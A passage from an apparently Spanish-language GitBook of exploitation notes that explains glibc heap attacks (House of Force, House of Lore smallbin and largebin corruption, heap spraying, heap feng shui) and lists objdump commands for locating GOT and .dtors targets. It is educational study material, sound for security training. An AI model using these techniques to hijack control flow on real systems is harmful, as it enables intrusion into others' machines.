<p>Victim recoge el valor de la direcci&#xF3;n del trozo wilderness actual (el actual av-&gt;top) y remainder es exactamente la suma de esa direcci&#xF3;n m&#xE1;s la cantidad de bytes solicitados por malloc(). Por lo que si &amp;EIP-8 est&#xE1; en 0xbffff224 y av-&gt;top contiene 0x080c2788, entonces la cantidad que tenemos que reservar en el malloc controlado para que av-&gt;top quede apuntando a $EIP-8 para el pr&#xF3;ximo malloc() ser&#xE1;:</p>
<p>0xbffff224 - 0x080c2788 = 3086207644.</p>
<p>As&#xED; se guardar&#xE1; en av-&gt;top el valor alterado y el pr&#xF3;ximo malloc apuntar&#xE1; al EIP y lo podr&#xE1; sobreescribir.</p>
<p>Es importante saber que el size del nuevo trozo wilderness sea m&#xE1;s grande que la solicitud realizada por el &#xFA;ltimo malloc(). Es decir, si el wilderness est&#xE1; apuntando a &amp;EIP-8, el size quedar&#xE1; justo en el campo EBP del stack.</p>
<p><strong>The House of Lore</strong></p>
<p><strong>Corrupci&#xF3;n SmallBin</strong></p>
<p>Los trozos liberados se introducen en el bin en funci&#xF3;n de su tama&#xF1;o. Pero antes de introduciros se guardan en unsorted bins. Un trozo es liberado no se mete inmediatamente en su bin sino que se queda en unsorted bins. A continuaci&#xF3;n, si se reserva un nuevo trozo y el anterior liberado le puede servir se lo devuelve, pero si se reserva m&#xE1;s grande, el trozo liberado en unsorted bins se mete en su bin adecuado.</p>
<p>Para alcanzar el c&#xF3;digo vulnerable la solicitud de memora deber&#xE1; ser mayor a av-&gt;max_fast (72normalmente) y menos  a MIN_LARGE_SIZE (512).</p>
<p>Si en los bin hay un trozo del tama&#xF1;o adecuado a lo que se pide se devuelve ese despu&#xE9;s de desenlazarlo:</p>
<p>bck = victim-&gt;bk; Apunta al trozo anterior, es la &#xFA;nica info que podemos alterar.</p>
<p>bin-&gt;bk = bck; El pen&#xFA;ltimo trozo pasa a ser el &#xFA;ltimo, en caso de que bck apunte al stack al siguiente trozo reservado se le dar&#xE1; esta direcci&#xF3;n</p>
<p>bck-&gt;fd = bin; Se cierra la lista haciendo que este apunte a bin</p>
<p>Se necesita:</p>
<p>Que se reserven dos malloc, de forma que al primero se le pueda hacer overflow despu&#xE9;s de que el segundo haya sido liberado e introducido en su bin (es decir, se haya reservado un malloc superior al segundo trozo antes de hacer el overflow)</p>
<p>Que el malloc reservado al que se le da la direcci&#xF3;n elegida por el atacante sea controlada por el atacante.</p>
<p>El objetivo es el siguiente, si podemos hacer un overflow a un heap que tiene por debajo un trozo ya liberado y en su bin, podemos alterar su puntero bk. Si alteramos su puntero bk y este trozo llega a ser el primero de la lista de bin y se reserva, a bin se le enga&#xF1;ar&#xE1; y se le dir&#xE1; que el &#xFA;ltimo trozo de la lista (el siguiente en ofrecer) est&#xE1; en la direcci&#xF3;n falsa que hayamos puesto (al stack o GOT por ejemplo). Por lo que si se vuelve a reservar otro trozo y el atacante tiene permisos en &#xE9;l, se le dar&#xE1; un trozo en la posici&#xF3;n deseada y podr&#xE1; escribir en ella.</p>
<p>Tras liberar el trozo modificado es necesario que se reserve un trozo mayor al liberado, as&#xED; el trozo modificado saldr&#xE1; de unsorted bins y se introducir&#xED;a en su bin.</p>
<p>Una vez en su bin es el momento de modificarle el puntero bk mediante el overflow para que apunte a la direcci&#xF3;n que queramos sobreescribir.</p>
<p>As&#xED; el bin deber&#xE1; esperar turno a que se llame a malloc() suficientes veces como para que se vuelva a utilizar el bin modificado y enga&#xF1;e a bin haci&#xE9;ndole creer que el siguiente trozo est&#xE1; en la direcci&#xF3;n falsa. Y a continuaci&#xF3;n se dar&#xE1; el trozo que nos interesa.</p>
<p>Para que se ejecute la vulnerabilidad lo antes posible lo ideal ser&#xED;a: Reserva del trozo vulnerable, reserva del trozo que se modificar&#xE1;, se libera este trozo, se reserva un trozo m&#xE1;s grande al que se modificar&#xE1;, se modifica el trozo (vulnerabilidad), se reserva un trozo de igual tama&#xF1;o al vulnerado y se reserva un segundo trozo de igual tama&#xF1;o y este ser&#xE1; el que apunte a la direcci&#xF3;n elegida.</p>
<p>Para proteger este ataque se uso la t&#xED;pica comprobaci&#xF3;n de que el trozo &#x201C;no&#x201D; es falso: se comprueba si bck-&gt;fd est&#xE1; apuntando a victim. Es decir, en nuestro caso si el puntero fd* del trozo falso apuntado en el stack est&#xE1; apuntando a victim. Para sobrepasar esta protecci&#xF3;n el atacante deber&#xED;a ser capaz de escribir de alguna forma (por el stack probablemente) en la direcci&#xF3;n adecuada la direcci&#xF3;n de victim. Para que as&#xED; parezca un trozo verdadero.</p>
<p><strong>Corrupci&#xF3;n LargeBin</strong></p>
<p>Se necesitan los mismos requisitos que antes y alguno m&#xE1;s, adem&#xE1;s los trozos reservados deben ser mayores a 512.</p>
<p>El ataque es como el anterior, es decir, ha que modificar el puntero bk y se necesitan todas esas llamadas a malloc(), pero adem&#xE1;s hay que modificar el size del trozo modificado de forma que ese size - nb sea &lt; MINSIZE.</p>
<p>Por ejemplo har&#xE1; que poner en size 1552 para que 1552 - 1544 = 8 &lt; MINSIZE (la resta no puede quedar negativa porque se compara un unsigned)</p>
<p>Adem&#xE1;s se ha introducido un parche para hacerlo a&#xFA;n m&#xE1;s complicado.</p>
<p><strong>Heap Spraying</strong></p>
<p>B&#xE1;sicamente consiste en reservar tooda la memoria posible para heaps y rellenar estos con un colch&#xF3;n de nops acabados por una shellcode. Adem&#xE1;s, como colch&#xF3;n se utiliza 0x0c. Pues se intentar&#xE1; saltar a la direcci&#xF3;n 0x0c0c0c0c, y as&#xED; si se sobreescribe alguna direcci&#xF3;n a la que se vaya a llamar con este colch&#xF3;n se saltar&#xE1; all&#xED;. B&#xE1;sicamente la t&#xE1;ctica es reservar lo m&#xE1;ximos posible para ver si se sobreescribe alg&#xFA;n puntero y saltar a 0x0c0c0c0c esperando que all&#xED; haya nops.</p>
<p><strong>Heap Feng Shui</strong></p>
<p>Consiste en mediante reservas y liberaciones sementar la memoria de forma que queden trozos reservados entre medias de trozos libres. El buffer a desbordar se situar&#xE1; en uno de los huevos.</p>
<p><strong>objdump -d ejecutable</strong> &#x2014;&gt; Disas functions<br><strong>objdump -d ./PROGRAMA | grep FUNCION</strong> &#x2014;&gt; Get function address<br><strong>objdump -d  -Mintel ./shellcodeout</strong> &#x2014;&gt; Para ver que efectivamente es nuestra shellcode y sacar los OpCodes<br><strong>objdump -t ./exec | grep varBss</strong> &#x2014;&gt; Tabla de s&#xED;mbolos, para sacar address de variables y funciones<br><strong>objdump -TR ./exec | grep exit(func lib)</strong> &#x2014;&gt; Para sacar address de funciones de librer&#xED;as (GOT)<br><strong>objdump -d ./exec | grep funcCode<br>objdump -s -j .dtors /exec<br>objdump -s -j .got ./exec<br>objdump -t --dynamic-relo ./exec | grep puts</strong> &#x2014;&gt; Saca la direcci&#xF3;n de puts a sobreescribir en le GOT<br><strong>objdump -D ./exec</strong> &#x2014;&gt; Disas ALL hasta las entradas de la plt<br><strong>objdump -p -/exec<br>Info functions strncmp &#x2014;&gt;</strong> Info de la funci&#xF3;n en gdb</p>
<h2 id="interesting-courses">Interesting courses</h2>
<ul>
<li><a href="https://guyinatuxedo.github.io/" target="_blank">https://guyinatuxedo.github.io/</a></li>
<li><a href="https://github.com/RPISEC/MBE" target="_blank">https://github.com/RPISEC/MBE</a></li>
</ul>

                                
                                </section>
                            
    </div>
    <div class="search-results">
        <div class="has-results">
            
            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
            <ul class="search-results-list"></ul>
            
        </div>
        <div class="no-results">
            
            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
            
        </div>
    </div>
</div>

                        </div>
                    </div>
                
            </div>

            
                
                <a href="../../physical-attacks/escaping-from-gui-applications/show-file-extensions.html" class="navigation navigation-prev " aria-label="Previous page: Show file extensions">
                    <i class="fa fa-angle-left"></i>
                </a>
                
                
                <a href="rop-syscall-execv.html" class="navigation navigation-next " aria-label="Next page: ROP - Syscall execv">
                    <i class="fa fa-angle-right"></i>
                </a>
                
            
        
    </div>

    <script>
        var gitbook = gitbook || [];
        gitbook.push(function() {
            gitbook.page.hasChanged({"page":{"title":"Linux Exploiting (Basic) (SPA)","level":"9.1","depth":1,"next":{"title":"ROP - Syscall execv","level":"9.1.1","depth":2,"path":"exploiting/linux-exploiting-basic-esp/rop-syscall-execv.md","ref":"exploiting/linux-exploiting-basic-esp/rop-syscall-execv.md","articles":[]},"previous":{"title":"Show file extensions","level":"8.2.1","depth":2,"path":"physical-attacks/escaping-from-gui-applications/show-file-extensions.md","ref":"physical-attacks/escaping-from-gui-applications/show-file-extensions.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":["livereload"],"pluginsConfig":{"livereload":{},"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"exploiting/linux-exploiting-basic-esp/README.md","mtime":"2020-10-31T14:46:18.927Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2020-10-31T15:33:28.507Z"},"basePath":"../..","book":{"language":""}});
        });
    </script>
</div>

        
    <script src="../../gitbook/gitbook.js"></script>
    <script src="../../gitbook/theme.js"></script>
    
        
        <script src="../../gitbook/gitbook-plugin-livereload/plugin.js"></script>
        
    
        
        <script src="../../gitbook/gitbook-plugin-search/search-engine.js"></script>
        
    
        
        <script src="../../gitbook/gitbook-plugin-search/search.js"></script>
        
    
        
        <script src="../../gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
        
    
        
        <script src="../../gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
        
    
        
        <script src="../../gitbook/gitbook-plugin-sharing/buttons.js"></script>
        
    
        
        <script src="../../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
        
    

    </body>
</html>

